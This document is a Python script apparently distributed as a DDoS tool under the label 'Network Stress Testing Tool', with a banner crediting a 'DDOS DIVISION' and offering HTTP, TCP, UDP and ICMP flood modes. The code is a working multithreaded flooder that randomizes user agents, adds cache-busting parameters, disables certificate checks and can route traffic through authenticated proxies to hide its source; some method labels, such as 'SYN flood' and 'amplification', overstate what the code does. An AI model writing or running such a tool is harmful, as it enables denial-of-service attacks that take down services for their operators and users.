#!/usr/bin/env python3
import requests
import threading
import time
import socket
import random
import subprocess
import platform
import sys
import urllib3
import argparse
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class NetworkStressTester:
    def __init__(self, target, method="http", threads=80, duration=60, use_proxy=False, proxy_config=None):
        self.target = target
        self.method = method.lower()
        self.threads = threads
        self.duration = duration
        self.use_proxy = use_proxy
        self.proxy_config = proxy_config
        
        self.running = True
        self.request_count = 0
        self.success_count = 0
        self.start_time = None
        self.lock = threading.Lock()
        
        # Parse target
        self.target_host = None
        self.target_port = None
        self.parse_target()
        
        # Setup proxy if needed
        self.proxies = None
        if self.use_proxy and self.proxy_config:
            self.setup_proxy()
    
    def parse_target(self):
        """Parse target based on method"""
        if self.method in ["tcp", "udp"]:
            if ":" in self.target:
                self.target_host, port_str = self.target.split(":", 1)
                try:
                    self.target_port = int(port_str)
                except ValueError:
                    self.target_port = 80 if self.method == "tcp" else 53
            else:
                self.target_host = self.target
                self.target_port = 80 if self.method == "tcp" else 53
        elif self.method == "icmp":
            if "://" in self.target:
                parsed = urlparse(self.target)
                self.target = parsed.netloc or parsed.path
                if ":" in self.target:
                    self.target = self.target.split(":")[0]
            self.target_host = self.target
        else:  # http
            self.target_host = self.target
    
    def setup_proxy(self):
        """Setup proxy configuration"""
        if self.proxy_config:
            proxy_url = f"http://{self.proxy_config['username']}:{self.proxy_config['password']}@{self.proxy_config['host']}:{self.proxy_config['port']}"
            self.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            print(f"✓ Proxy configured: {self.proxy_config['host']}:{self.proxy_config['port']}")
    
    def get_random_user_agent(self):
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]
        return random.choice(user_agents)
    
    def get_request_headers(self):
        """Generate request headers"""
        return {
            'User-Agent': self.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
    
    def icmp_test(self):
        """ICMP ping test"""
        try:
            system = platform.system().lower()
            
            if system == "windows":
                cmd = f"ping -n 1 -w 1000 {self.target_host}"
            else:
                cmd = f"ping -c 1 -W 1 {self.target_host}"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=2)
            success = result.returncode == 0
            
            with self.lock:
                self.request_count += 1
                if success:
                    self.success_count += 1
            
            return success
        except:
            with self.lock:
                self.request_count += 1
            return False
    
    def tcp_test(self):
        """TCP connection test"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            result = sock.connect_ex((self.target_host, self.target_port))
            success = result == 0
            
            if success:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\n\r\n")
            
            sock.close()
            
            with self.lock:
                self.request_count += 1
                if success:
                    self.success_count += 1
            
            return success
        except:
            with self.lock:
                self.request_count += 1
            return False
    
    def udp_test(self):
        """UDP packet test"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            payloads = [
                b"X" * 512,
                b"X" * 1024,
                b"X" * 2048,
                b"X" * 4096
            ]
            
            payload = random.choice(payloads)
            sock.sendto(payload, (self.target_host, self.target_port))
            
            sock.close()
            
            with self.lock:
                self.request_count += 1
                self.success_count += 1  # UDP is connectionless, assume success
            
            return True
        except:
            with self.lock:
                self.request_count += 1
            return False
    
    def http_test(self):
        """HTTP request test"""
        try:
            headers = self.get_request_headers()
            
            # Add cache busting
            timestamp = int(time.time() * 1000)
            params = {
                '_': str(timestamp),
                'id': str(random.randint(1, 1000000))
            }
            
            response = requests.get(
                self.target,
                headers=headers,
                params=params,
                proxies=self.proxies,
                verify=False,
                timeout=5,
                allow_redirects=False
            )
            
            success = response.status_code < 500
            
            with self.lock:
                self.request_count += 1
                if success:
                    self.success_count += 1
            
            return success
        except:
            with self.lock:
                self.request_count += 1
            return False
    
    def worker(self):
        """Worker thread"""
        while self.running and (time.time() - self.start_time) < self.duration:
            try:
                if self.method == "icmp":
                    self.icmp_test()
                elif self.method == "tcp":
                    self.tcp_test()
                elif self.method == "udp":
                    self.udp_test()
                else:  # http
                    self.http_test()
                
                time.sleep(0.01)  # Small delay
            except:
                continue
    
    def monitor(self):
        """Monitor and display stats"""
        last_count = 0
        
        while self.running and (time.time() - self.start_time) < self.duration:
            time.sleep(1)
            
            elapsed = time.time() - self.start_time
            current_count = self.request_count
            interval_requests = current_count - last_count
            
            success_rate = (self.success_count / current_count * 100) if current_count > 0 else 0
            
            sys.stdout.write(f"\r⚡ Requests: {current_count:,} | RPS: {interval_requests} | Success: {success_rate:.1f}% | Time: {elapsed:.1f}s")
            sys.stdout.flush()
            
            last_count = current_count
    
    def start(self):
        """Start the stress test"""
        print(f"\n🎯 Target: {self.target}")
        print(f"⚔️ Method: {self.method.upper()}")
        print(f"🔥 Threads: {self.threads}")
        print(f"⏱️ Duration: {self.duration}s")
        print(f"🌐 Proxy: {'Yes' if self.use_proxy else 'No'}")
        print("\n🚀 Starting attack...\n")
        
        self.start_time = time.time()
        self.running = True
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=self.monitor, daemon=True)
        monitor_thread.start()
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            try:
                futures = [executor.submit(self.worker) for _ in range(self.threads)]
                
                # Wait for duration
                time.sleep(self.duration)
                
            except KeyboardInterrupt:
                print("\n\n🛑 Stopping...")
            finally:
                self.running = False
        
        # Print final stats
        print("\n\n" + "="*60)
        print("📊 FINAL STATISTICS")
        print("="*60)
        print(f"Total Requests: {self.request_count:,}")
        print(f"Successful: {self.success_count:,}")
        print(f"Failed: {(self.request_count - self.success_count):,}")
        
        if self.request_count > 0:
            success_rate = (self.success_count / self.request_count) * 100
            print(f"Success Rate: {success_rate:.2f}%")
        
        elapsed = time.time() - self.start_time
        rps = self.request_count / elapsed if elapsed > 0 else 0
        print(f"Duration: {elapsed:.2f}s")
        print(f"Avg RPS: {rps:.2f}")
        print("="*60)

def print_banner():
    """Print tool banner"""
    banner = """
\033[38;5;46m
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █░░░░░░░░▀█▄░░░░░░░░░░░░░░░░░░░▄█▀░░░░░░░░█░░░░░░░░░░░░░░░░░▄█▀░░░░░░░░█
    █░░▄▀▀▀▀▀▀░░░▀█▄░░░░░░░░░░░░▄█▀░░░▀▀▀▀▀▄░█░░▄▀▀▀▀▀▀░░░░▄█▀░░░▀▀▀▀▀▄░░█
    █░░█▄▄░░░░░░░░░░▀█▄░░░░░░▄█▀░░░░░░░░▄▄█░█░░█▄▄░░░░░░▄█▀░░░░░░░░▄▄█░░░█
    █░░░░░▀█▄░░░░░░░░░░▀█▄▄█▀░░░░░░░░▄█▀░░░░█░░░░░▀█▄▄█▀░░░░░░░░▄█▀░░░░░░█
    █░░░░░░░░▀█▄░░░░░░░░░░░░░░░░░░▄█▀░░░░░░░░█░░░░░░░░░░░░░░░░▄█▀░░░░░░░░░█
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

             ██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗
             ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║
             ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝
             ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝ 
             ███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║  
             ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝  
                                                      
                      [NETWORK STRESS TESTING TOOL]
                    [CREATED BY: BTR DDOS DIVISION]
                        [FOR EDUCATIONAL USE ONLY]

    AVAILABLE METHODS:
        • ICMP - ICMP Ping Flood
        • TCP  - TCP SYN Flood
        • UDP  - UDP Amplification
        • HTTP - HTTP Layer 7 Flood (Default)

    USAGE:
        python tool.py -u <target> -m <method> -t <threads> -d <duration>

    EXAMPLES:
        python tool.py -u https://example.com
        python tool.py -u example.com -m tcp -t 100 -d 120
        python tool.py -u 192.168.1.1:80 -m udp -t 200
        python tool.py -u example.com -m icmp

\033[0m"""
    print(banner)

def main():
    """Main function"""
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='Network Stress Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL or IP')
    parser.add_argument('-m', '--method', default='http', 
                       choices=['http', 'tcp', 'udp', 'icmp'],
                       help='Attack method (default: http)')
    parser.add_argument('-t', '--threads', type=int, default=80,
                       help='Number of threads (default: 80)')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Duration in seconds (default: 60)')
    parser.add_argument('-p', '--proxy', action='store_true',
                       help='Use proxy (requires proxy config)')
    parser.add_argument('--proxy-host', help='Proxy host')
    parser.add_argument('--proxy-port', help='Proxy port')
    parser.add_argument('--proxy-user', help='Proxy username')
    parser.add_argument('--proxy-pass', help='Proxy password')
    
    args = parser.parse_args()
    
    # Validate proxy config
    proxy_config = None
    if args.proxy:
        if all([args.proxy_host, args.proxy_port, args.proxy_user, args.proxy_pass]):
            proxy_config = {
                'host': args.proxy_host,
                'port': args.proxy_port,
                'username': args.proxy_user,
                'password': args.proxy_pass
            }
        else:
            print("\n❌ Error: Proxy enabled but config incomplete")
            print("   Required: --proxy-host, --proxy-port, --proxy-user, --proxy-pass")
            sys.exit(1)
    
    # Validate target format
    target = args.url
    if args.method == "http" and not target.startswith(('http://', 'https://')):
        target = f"http://{target}"
    
    # Create and start tester
    try:
        tester = NetworkStressTester(
            target=target,
            method=args.method,
            threads=args.threads,
            duration=args.duration,
            use_proxy=args.proxy,
            proxy_config=proxy_config
        )
        
        tester.start()
        
    except KeyboardInterrupt:
        print("\n\n🛑 Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
